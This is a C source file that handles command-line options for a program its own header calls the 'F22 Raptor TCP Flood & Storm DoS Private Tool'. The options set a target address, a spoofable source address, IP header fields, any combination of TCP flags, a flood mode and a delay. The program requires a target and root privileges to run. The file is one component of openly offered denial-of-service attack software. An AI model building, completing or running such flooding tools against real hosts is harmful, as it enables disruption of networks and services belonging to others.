/* 
 * $Id: options.c,v 1.10 2009-08-16 14:17:54-03 nbrito Exp $
 *
 * Author: Nelson Brito <nbrito@sekure.org>
 *
 * Copyright© 2004-2009 Nelson Brito.
 * This file is part of F22 Raptor TCP Flood & Storm DoS Private Tool.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.
 
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef OPTIONS_C__
#define OPTIONS_C__ 1

#include <common.h>

/* Function Name: CLI Options routine.

   Description:   This is configures and verifies the command line options.

   Targets:       N/A */
const struct options process_options(int argc, char ** argv){
	int32_t clo;

	/* Command-line options structure. */
	struct options o = {
		/* Common options.                                   */
		1000,                /* default threshold            */
		0,                   /* do not flood                 */
		1,                   /* default delay is 1 msec      */
		0,                   /* do not show copyright        */
		/* IP header options.                                */
		IPTOS_PREC_IMMEDIATE,/* default type of service      */
		255,                 /* defautl time to live         */
		getpid(),            /* default identification       */
		INADDR_ANY,          /* source address               */
		INADDR_ANY,          /* destination address          */
		/* TCP header options.                               */
		IPPORT_DNS,          /* general source port          */
		IPPORT_DNS,          /* general destination port     */
		0,                   /* acklowdgement sequence       */
		0,                   /* end of data flag             */
		0,                   /* synchronize ISN flag         */
		0,                   /* reset connection flag        */
		0,                   /* push flag                    */
		0,                   /* acknowledgment # valid flag  */
		0,                   /* urgent pointer valid flag    */
		0,                   /* ecn-echo                     */
		0,                   /* congestion windows reduced   */
		0,                   /* TCP window size              */
		0,                   /* urgent pointer data          */
	};

	/* Command-line options which do not have short options. */
	enum {
		THRESHOLD,
		FLOOD,
		DELAY,
		COPYRIGHT,
		TOS,
		TTL,
		ID,
		SOURCE,
		DESTINATION,
		ACK_SEQ,
		URG_PTR,
	};

	static const struct option long_opt[] = {
		/* Common options.                                 */
		{ "threshold", required_argument, NULL, THRESHOLD   },
		{ "flood",     no_argument,       NULL, FLOOD       },
		{ "delay",     required_argument, NULL, DELAY       },
		{ "copyright", no_argument,       NULL, COPYRIGHT   },
		/* IP header options.                              */
		{ "saddr",     required_argument, NULL, 's'         },
		{ "daddr",     required_argument, NULL, 'd'         },
		{ "tos",       required_argument, NULL, TOS         },
		{ "ttl",       required_argument, NULL, TTL         },
		{ "id",        required_argument, NULL, ID          },
		/* TCP header options.                             */
		{ "sport",     required_argument, NULL, SOURCE      },
		{ "dport",     required_argument, NULL, DESTINATION },
		{ "ack_seq",   required_argument, NULL, ACK_SEQ     },
		{ "fin",       no_argument,       NULL, 'F'         },
		{ "syn",       no_argument,       NULL, 'S'         },
		{ "rst",       no_argument,       NULL, 'R'         },
		{ "psh",       no_argument,       NULL, 'P'         },
		{ "ack",       no_argument,       NULL, 'A'         },
		{ "urg",       no_argument,       NULL, 'U'         },
		{ "ece",       no_argument,       NULL, 'E'         },
		{ "cwr",       no_argument,       NULL, 'C'         },
		{ "window",    required_argument, NULL, 'W'         },
		{ "urg_ptr",   required_argument, NULL, URG_PTR     },
		{ "help",      no_argument,       NULL, 'h'         },
		{ 0,           0,                 NULL, 0           }
	};

	while(1){
		int32_t opt_ind = 0;

		if((clo = getopt_long(argc, argv, "s:d:W:h?FSRPAUEC", long_opt, &opt_ind)) == -1)
			break;

		switch(clo){
			/* Common options.                                       */
			case THRESHOLD:
				o.threshold = atoi(optarg);
				break;
			case FLOOD:
				o.flood = 1;
				break;
			case DELAY:
				o.delay = atoi(optarg);
				break;
			case COPYRIGHT:
				o.copyright = 1;
				break;
			/* IP header options.                                    */
			case TOS:
				o.tos = atoi(optarg);
				break;
			case TTL:
				o.ttl = atoi(optarg);
				break;
			case ID:
				o.id = atoi(optarg);
				break;
			case 's':
				o.saddr = resolv(optarg);
				break;
			case 'd':
				o.daddr = resolv(optarg);
				break;
			/* TCP header options.                                   */
			case SOURCE:
				o.source = atoi(optarg);
				break;
			case DESTINATION:
				o.dest = atoi(optarg);
				break;
			case ACK_SEQ:
				o.ack_seq = atoi(optarg);
				break;
			case 'F':
				o.fin = 1;
				break;
			case 'S':
				o.syn = 1;
				break;
			case 'R':
				o.rst = 1;
				break;
			case 'P':
				o.psh = 1;
				break;
			case 'A':
				o.ack = 1;
				break;
			case 'U':
				o.urg = 1;
				break;
			case 'E':
				o.ece = 1;
				break;
			case 'C':
				o.cwr = 1;
				break;
			case 'W':
				o.window = atoi(optarg);
				break;
			case URG_PTR:
				o.urg_ptr = atoi(optarg);
				break;
			case 'h':
			case '?':
				usage(program, author, email);
				break;
			default:
#ifdef  __HAVE_DEBUG__
				printf("function %s in file %s (line %d)\n",
					__FUNCTION__,
					__FILE__,
					(__LINE__ - 6));
#endif  /* __HAVE_DEBUG__ */
				printf("type \"%s --help\" for further information\n", program);
				exit(EXIT_FAILURE);
				break;
		}
	}

	argc -= optind;
	argv += optind;

	/* Printing a little banner. */
	printf("F22 [Version %s.%s-%s] Built on %s %s\n", MAJOR_VERSION, MINOR_VERSION, BUILD_VERSION, __DATE__, __TIME__);

	if(o.copyright){
		nb(copyright,  31337);
		exit(EXIT_SUCCESS);
	}

	/* Warning missed target. */
	if(o.daddr == INADDR_ANY){
#ifdef  __HAVE_DEBUG__
		printf("function %s in file %s (line %d)\n",
				__FUNCTION__,
				__FILE__,
				(__LINE__ - 6));
#endif  /* __HAVE_DEBUG__ */
		printf("you must specify the target to run the %s\n", program);
		printf("type \"%s --help\" for further information\n", program);
		exit(EXIT_FAILURE);
	}

	/* Warning missed privileges. */
	if(getuid()){
#ifdef  __HAVE_DEBUG__
		printf("function %s in file %s (line %d)\n",
				__FUNCTION__,
				__FILE__,
				(__LINE__ - 6));
#endif  /* __HAVE_DEBUG__ */
		printf("you must have privileges to run the %s\n", program);
		exit(EXIT_FAILURE);
	}

	return(o);
}
#endif  /* OPTIONS_C__ */
